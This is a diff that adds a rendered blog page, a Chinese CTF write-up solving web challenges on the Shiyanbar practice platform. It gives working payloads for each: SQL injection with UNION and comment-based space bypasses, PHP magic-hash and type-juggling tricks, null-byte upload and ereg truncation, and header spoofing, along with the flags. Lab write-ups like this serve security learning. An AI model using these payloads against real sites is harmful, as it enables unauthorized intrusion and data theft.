@@ -1,23 +1,597 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://github.com/Windylh/image/raw/master/icon.ico">
+  <link rel="mask-icon" href="https://github.com/Windylh/image/raw/master/icon.ico" color="#222">
 
-{% block title %}{{ page.title }} | {{ title }}{% endblock %}
+<link rel="stylesheet" href="/css/main.css">
 
-{% block page_class %}page-post-detail{% endblock %}
 
-{% block content %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="PHP大法题目：http:&#x2F;&#x2F;www.shiyanbar.com&#x2F;ctf&#x2F;54 提示访问index.php.txt 1234567891011121314151617&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);  exit();">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧(Web部分)Writeup">
+<meta property="og:url" content="http://yoursite.com/2017/09/15/%E5%AE%9E%E9%AA%8C%E5%90%A7(Web%E9%83%A8%E5%88%86)Writeup/index.html">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="PHP大法题目：http:&#x2F;&#x2F;www.shiyanbar.com&#x2F;ctf&#x2F;54 提示访问index.php.txt 1234567891011121314151617&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);  exit();">
+<meta property="og:locale">
+<meta property="og:image" content="http://ctf5.shiyanbar.com/web/web200.jpg">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.7.25/upload1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.7.25/upload1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.7.25/hash1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.7.25/hash2.png">
+<meta property="article:published_time" content="2017-09-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2018-11-01T10:52:57.138Z">
+<meta property="article:author" content="Windylh">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ctf5.shiyanbar.com/web/web200.jpg">
+
+<link rel="canonical" href="http://yoursite.com/2017/09/15/%E5%AE%9E%E9%AA%8C%E5%90%A7(Web%E9%83%A8%E5%88%86)Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>实验吧(Web部分)Writeup | Windylh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Windylh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/15/%E5%AE%9E%E9%AA%8C%E5%90%A7(Web%E9%83%A8%E5%88%86)Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          实验吧(Web部分)Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-09-15 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-15T00:00:00+08:00">2017-09-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2018-11-01 18:52:57" itemprop="dateModified" datetime="2018-11-01T18:52:57+08:00">2018-11-01</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/54">http://www.shiyanbar.com/ctf/54</a></p>
+<p>提示访问index.php.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;hackerDJ&quot;</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;hackerDJ&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>和XMAN的urlencode差不多的思路，不过XMAN的题目并没有给源码。</p>
+<p>url编码会自动解码一次，所以需要将id变量的值进行两次urlencode。</p>
+<p>payload：<code>?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</code></p>
+<p>flag:<code>DUTCTF&#123;PHP_is_the_best_program_language&#125;</code></p>
+<h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1760">http://www.shiyanbar.com/ctf/1760</a></p>
+<p>题目给出图片。<br><img src="http://ctf5.shiyanbar.com/web/web200.jpg" alt="题目"></p>
+<p>直接写解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span>((<span class="built_in">ord</span>(i)&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">or</span> (<span class="built_in">ord</span>(i)&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>))):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(i)&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">elif</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(i)&gt;=<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=i;</span><br><span class="line"></span><br><span class="line">flag=flag[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">flag=base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i])-<span class="number">1</span>)</span><br><span class="line">s=s[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</code></p>
+<h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1808">http://www.shiyanbar.com/ctf/1808</a></p>
+<p>进入网站step1.php，查看源代码，发现一句<code>&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt;</code></p>
+<p>vim编辑，可能存在<code>.xxxx.php.swp</code>的备份文件。尝试了<code>.step1.php.swp</code>、<code>.step2.php.swp</code>，都是404，查看step2.php的源码，发现有一个Submit.php，直接访问，提示<code>you are not an admin</code>，访问<code>.submit.php.swp</code>，果然存在，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$token</span>)&amp;&amp;!<span class="keyword">empty</span>(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$token</span>)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$r</span>);</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$r</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are not an admin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>邮箱为admin的邮箱，要求token长度为10，且token需要等于零。</p>
+<p>邮箱在step1.php中有提到<code>&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;</code></p>
+<p>token验证可以用php中的<code>0exxxxxxxx</code>绕过。</p>
+<p>payload：<code>?emailAddress=admin@simplexue.com&amp;token=0e11111111</code></p>
+<p>flag：<code>SimCTF&#123;huachuan_TdsWX&#125;</code></p>
+<h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>题目:<a href="http://www.shiyanbar.com/ctf/33">http://www.shiyanbar.com/ctf/33</a></p>
+<p>访问题目地址，给出了一个带<code>?id=1</code>的地址，和一个表格，猜测sql注入。</p>
+<p>用常用的<code>&#39;</code>,<code>and 1=1</code>,<code>and 1=2</code>,判断存在sql注入。</p>
+<p>表格有两列，所以判断数据库中也是两列。</p>
+<p>查询数据库名<code>?id=1 union select 1,concat(database()) --</code>，得到库名<code>my_db</code>。</p>
+<p>查询数据库表名<code>?id=1 union select 1,concat(table_name) from information_schema.tables where table_schema=database() --</code>，得到两个表名，<code> news</code>,<code>thiskey</code></p>
+<p>查询thiskey表的字段名<code>?id=1 union select 1,concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;thiskey&#39;  --</code>，查到字段<code>k0y</code></p>
+<p>爆出字段k0y<code>?id=1 union select 1,concat(k0y) from thiskey  --</code>,得到flag。</p>
+<p>flag：<code>whatiMyD91dump</code></p>
+<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1781">http://www.shiyanbar.com/ctf/1781</a></p>
+<p>题目要求上传一个jpg,gif,png格式的文件，但是上传之后有要求是php格式。</p>
+<p>上传绕过，在filename后加<code>%00.jpg</code>，在Hex视图下修改目录后空格的<code>20</code>为<code>00</code>，即可绕过。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2017.7.25/upload1.png" alt="1"><br><img src="https://github.com/Windylh/image/raw/master/2017.7.25/upload1.png" alt="2"></p>
+<p>flag:<code>flag&#123;SimCTF_huachuan&#125;</code></p>
+<h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1810">http://www.shiyanbar.com/ctf/1810</a></p>
+<p>查看源代码，有注释。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $test=$_GET[&#x27;username&#x27;]; $test=md5($test); if($test==&#x27;0&#x27;) --&gt;</span><br></pre></td></tr></table></figure>
+<p>让username的MD5和0相等，可以让MD5以<code>0e</code>开头。</p>
+<p><a href="http://www.cnblogs.com/Primzahl/p/6018158.html">0e开头的MD5总结</a></p>
+<p>username输入<code>QNKCDZO</code>，得到<code>/user.php?fame=hjkleffifer</code>，访问页面看到一段php源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]; </span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$unserialize_str</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">&#x27;user&#x27;</span>] == <span class="string">&#x27;???&#x27;</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="string">&#x27;???&#x27;</span>) </span><br><span class="line">&#123;  </span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这段php将post的password值进行了反序列化，得到了一个数组，将数组的user和pass的值和???进行了比较。比较用到了php的弱类型，<strong>bool类型的true跟任意字符串可以弱类型相等</strong>*。</p>
+<p>payload:<code>post：a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;</code></p>
+<p>flag:<code>ctf&#123;dwduwkhduw5465&#125;</code></p>
+<h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1805">http://www.shiyanbar.com/ctf/1805</a></p>
+<p>php审计题，源码如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . <span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>ereg()</code>函数用<code>%00</code>来截断，password变量的长度要小于8，且大于9999999，用科学记数法，即9e9&#x3D;9*10^9，最后加上<code>*-*</code>即可</p>
+<p>payload:<code>?password=9e9%00*-*</code></p>
+<p>flag:<code>CTF&#123;Ch3ck_anD_Ch3ck&#125;</code></p>
+<h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1875">http://www.shiyanbar.com/ct f/1875</a></p>
+<p>题目给出了常见的<code>?id=1</code>参数，下面有id的返回值和name的返回值，我们可以通过id的输出来判断到底过滤了什么。</p>
+<p>输入<code>union select</code>的时候，union消失了。再加空格之后select也消失了。猜测是过滤了空格，将两个空格中间的字符一起删除。</p>
+<p>空格可以使用<code>/**/、()</code>过滤，构造<code>?id=1/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code>，ID部分正常回显，说明可以绕过，单引号闭合就是payload。</p>
+<p>payload：<code>?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p>
+<p>flag：<code>flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</code></p>
+<h3 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1854">http://www.shiyanbar.com/ctf/1854</a></p>
+<p>打开网页，查看源代码，获得提示<code>&lt;!-- please post what you find with parameter:key --&gt;</code>，让我们post参数key。</p>
+<p>抓包发现header头中有经过base64编码的flag参数，将参数解码<code>P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9</code>，将参数<code>9x3PyMMd9</code>post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解决。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ctf5.shiyanbar.com/web/10/10.php&#x27;</span></span><br><span class="line">response=requests.get(url)</span><br><span class="line">head=response.headers</span><br><span class="line">flag=base64.b64decode(head[<span class="string">&#x27;flag&#x27;</span>]).split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line">post=&#123;<span class="string">&quot;key&quot;</span>:flag&#125;</span><br><span class="line">result=requests.post(url=url, data=post) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> result.text</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>flag：<code>CTF&#123;Y0U_4R3_1NCR3D1BL3_F4ST!&#125;</code></p>
+<h3 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/21">http://www.shiyanbar.com/ctf/21</a></p>
+<p>页面提示<code>Make sure you are in HongKong</code>。</p>
+<p>直接用burpsuit抓包，修改<code>Accept-Language:</code>的值zh-hk，重放即可得到flag。</p>
+<p>flag：<code>123JustUserAGent</code></p>
+<h3 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1908">http://www.shiyanbar.com/ctf/1908</a></p>
+<p>用<code>?id=1 and 1=1</code>测试，返回<code>SQLi detected!</code>，这是过滤了and？又尝试了很多关键字，都返回<code>SQLi detected!</code>，那可能是过滤了空格。</p>
+<p>用<code>/**/</code>绕过对空格的过滤，构造测试payload<code>?id=1/**/union/**/select/**/flag/**/from/**/flag/**/where/**/1=1</code>发现正常回显，用单引号闭合就是payload。</p>
+<p>payload：<code>?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p>
+<p>flag：<code>flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</code></p>
+<h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>题目：<a href="http://www.shiyanbar.com/ctf/1909">http://www.shiyanbar.com/ctf/1909</a></p>
+<p>与前两题类似，也是get参数id进行查询。</p>
+<p>输入?id&#x3D;1，页面正常输出hello，?id&#x3D;0页面不输出。</p>
+<p>输入?id&#x3D;’页面直接报SQL语法错误。</p>
+<p>输入?id&#x3D;1 and 1&#x3D;2页面正常 ?id&#x3D;1’ and ‘1’&#x3D;’2 页面无输出。</p>
+<p>可以看出这是字符型的sql注入，并且没有过滤<code>and</code>和<code>&#39;</code>，在参数正确的情况下输出Hello，错误的情况下无输出。</p>
